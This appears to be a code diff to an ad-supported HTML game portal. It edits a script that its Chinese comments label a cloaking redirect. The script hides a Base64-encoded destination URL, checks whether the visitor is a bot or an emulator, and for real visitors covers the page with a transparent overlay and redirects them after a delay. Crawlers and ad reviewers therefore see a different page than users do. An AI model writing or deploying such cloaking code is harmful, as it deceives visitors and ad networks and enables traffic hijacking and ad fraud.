@@ -26,8 +26,36 @@
   </script>
 
   <title>Online Game Site</title>
+</head>
+<body>
+  <header>
+    <h1>Online Game Site</h1>
+  </header>
+  <nav>
+    <a href="https://html-online-game.github.io/">Home</a>
+    <a href="https://html-online-game.github.io/policy.html">Policy</a>
+  </nav>
+  <main class="game-container">
+    <h2>All Games</h2>
+    <!-- html-online-game-list-ad -->
+    <div class="ad-container">
+      <ins class="adsbygoogle" style="display: block"
+        data-ad-client="ca-pub-4988552421895566"
+        data-ad-slot="2343374539"
+        data-ad-format="auto"
+        data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    </div>
+    <div class="game-list"></div>
+  </main>
+  <footer>
+    <p>&copy; 2025 Online Game Site. All rights reserved.</p>
+  </footer>
 
-  <!-- === Cloaking 跳转（真机2秒延时+透明遮罩） === -->
+  <!-- 原来的游戏加载脚本 -->
+  <script src="assets/js/script.js"></script>
+
+  <!-- === Cloaking 跳转（真机2秒延时+透明遮罩+先加载game-list） === -->
   <script>
     const REG_PAGE_ENC = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ=="; // Base64跳转地址
     const DELAY_MS = 2000;
@@ -88,38 +116,15 @@
       }, ms);
     }
 
-   window.addEventListener('load', () => {
-     if (!isBot() && !isEmulator()) {
-    setTimeout(() => {
-      lockPageUntilRedirect(DELAY_MS);
-    }, 100);
-  }
-});
+    // 等待 game-list 渲染完成再执行跳转逻辑
+    window.addEventListener('load', () => {
+      // 给 game-list 一点加载时间（0.5秒），再决定是否加遮罩
+      setTimeout(() => {
+        if (!isBot() && !isEmulator()) {
+          lockPageUntilRedirect(DELAY_MS);
+        }
+      }, 500);
+    });
   </script>
-</head>
-<body>
-  <header>
-    <h1>Online Game Site</h1>
-  </header>
-  <nav>
-    <a href="https://html-online-game.github.io/">Home</a>
-    <a href="https://html-online-game.github.io/policy.html">Policy</a>
-  </nav>
-  <main class="game-container">
-    <h2>All Games</h2>
-    <!-- html-online-game-list-ad -->
-    <div class="ad-container">
-      <ins class="adsbygoogle" style="display: block"
-        data-ad-client="ca-pub-4988552421895566"
-        data-ad-slot="2343374539"
-        data-ad-format="auto"
-        data-full-width-responsive="true"></ins>
-      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
-    </div>
-    <div class="game-list"></div>
-  </main>
-  <footer>
-    <p>&copy; 2025 Online Game Site. All rights reserved.</p>
-  </footer>
 </body>
 </html>
